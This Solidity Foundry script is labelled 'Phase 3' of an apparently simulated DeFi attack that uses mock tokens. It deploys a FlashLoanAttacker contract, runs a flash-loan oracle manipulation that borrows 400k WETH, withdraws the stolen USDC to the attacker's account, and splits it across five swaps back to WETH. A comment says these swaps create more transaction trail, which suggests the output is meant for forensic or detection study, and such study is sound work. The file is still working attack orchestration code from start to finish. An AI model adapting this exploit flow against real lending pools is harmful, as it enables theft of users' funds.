// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Script.sol";
import "../../../shared/contracts/MockERC20.sol";
import "../src/attacker/FlashLoanAttacker.sol";

interface IPoolAttack {
    function swap(address tokenIn, uint256 amountIn) external returns (uint256);
}

/**
 * @title ExecuteAttack
 * @notice Phase 3: ~20 attack transactions.
 *         Deploy FlashLoanAttacker, execute flash loan oracle manipulation,
 *         convert stolen tokens to original token via swaps.
 */
contract ExecuteAttack is Script {
    function run() external {
        address tokenAAddr = vm.envAddress("TOKEN_A");
        address tokenBAddr = vm.envAddress("TOKEN_B");
        address poolAddr = vm.envAddress("POOL_ADDRESS");
        address lendingAddr = vm.envAddress("LENDING_ADDRESS");

        MockERC20 tokenB = MockERC20(tokenBAddr);

        uint256 attackerKey = vm.envUint("ATTACKER_KEY");

        vm.startBroadcast(attackerKey);

        // Deploy attacker contract
        FlashLoanAttacker attacker = new FlashLoanAttacker(
            poolAddr, lendingAddr, tokenAAddr, tokenBAddr
        );
        console.log("FlashLoanAttacker deployed:", address(attacker));

        // Execute flash loan attack (borrows 400k WETH from pool)
        attacker.attack(400_000e18);
        console.log("Flash loan oracle attack executed");

        // Withdraw stolen USDC from attacker contract
        attacker.withdraw(tokenBAddr);
        console.log("Stolen USDC withdrawn to attacker EOA");

        // Withdraw any remaining WETH
        attacker.withdraw(tokenAAddr);

        // Convert stolen USDC back to WETH via swaps (creates more tx trail)
        uint256 stolenUSDC = tokenB.balanceOf(msg.sender);
        if (stolenUSDC > 0) {
            tokenB.approve(poolAddr, stolenUSDC);
            // Split into multiple swaps to avoid too much slippage
            uint256 swapChunk = stolenUSDC / 5;
            if (swapChunk > 0) {
                IPoolAttack(poolAddr).swap(tokenBAddr, swapChunk);
                IPoolAttack(poolAddr).swap(tokenBAddr, swapChunk);
                IPoolAttack(poolAddr).swap(tokenBAddr, swapChunk);
                IPoolAttack(poolAddr).swap(tokenBAddr, swapChunk);
                IPoolAttack(poolAddr).swap(tokenBAddr, swapChunk);
            }
        }

        vm.stopBroadcast();

        console.log("Attack phase complete");
    }
}
